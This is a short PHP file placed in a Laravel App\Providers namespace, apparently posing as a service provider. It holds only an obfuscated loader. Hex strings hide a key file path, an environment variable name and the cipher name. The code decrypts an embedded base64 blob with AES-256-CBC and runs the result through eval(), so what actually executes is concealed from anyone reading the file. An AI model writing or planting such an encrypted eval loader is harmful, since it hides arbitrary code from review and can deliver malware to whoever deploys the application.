<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('KzpevPXL6k1Y5hOTve535w==');

$c=base64_decode(

'H8CzA8CkRE6DxLwabE0onshy2KUD6Vk4qbMHBCbU2pF65xjK/Yy4K27xWrdCZfYS3PdsGO1Rw46h' .
'AIVWS4nqHIVp43+AWUR1Pcck1weSrA/2lTCR/t2fTE22N58wDN/w4RwcwxSTAj+ap6Up0IM5xGS6' .
'lv/1HlJUELRPA/W6qwkz2oBYzTtiJ4ghoH6heANI+Bmw+ncoyKXzlTJSUIB59+66CAiFmaCegi2f' .
'ghQD6Q5gl3yDQBslrraBQXDyJDq5qkaXXKWnDFKKymMKQvvG3u6XKlewi8A6SNfd+ADYkUXS0Pt7' .
'MV6s+qOYeKDKIoyfxQUyGb3SiehneXZVXsD9YejyKy/AWvjmsr9Vn/PPB7PM5ciRG9nG6I7yC0X4' .
'WhAR5Ip1JB/9veQSz1YdG45wdKg6GjzsMU9eiIHTT4wnzf8gk+uFkHPYBFf0UMDk73GrKpJL91v4' .
'bgzNINb/LZ7KQ9BYkh1KOsAGQt3intwikE6p2yz38T2wsAHreIDdPJsRlp/hhnPUpnglXFixU4at' .
'LM2Eacanr6ELgM8vUeVjWgxN7oxMRJC19KTXA2B5cyuccp4oBJOboUcaCFrx6QJuvIPgPF8Yi+lo' .
'oaWyDUfgZ7fhLkpwKwCKoPHmfYmii/q6HgKTck1P+f3zqpq8BHhhm4pizS+AJIQ3AlA2xKWmP6m3' .
'aeCetPQJUNxFpUtzTEoN2HEF+vfV92gIo13/WAcLqauqx1Kqz4m+y7C/xC7R+KUS6jO61xdSaM3+' .
'mBTg9EgVaF+ss584fUXYFXPRCwtDX3i/OQlQdAx1Q/UFJpp3jLYVaAMzgqjCZ+h2W9xOUd9rrW8c' .
'JqwUr0xEXQoLkeakCQqi0VCPKU7tpkB84OOzDVRQLhVxWK4O3UJ4vg8WbqS6GrCAAwe9uSaf/c8R' .
'9gh/khO0V5ZbB9UC5Mw8idHG0pI0Wa+JjnXP485UoDJ7pcx8'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

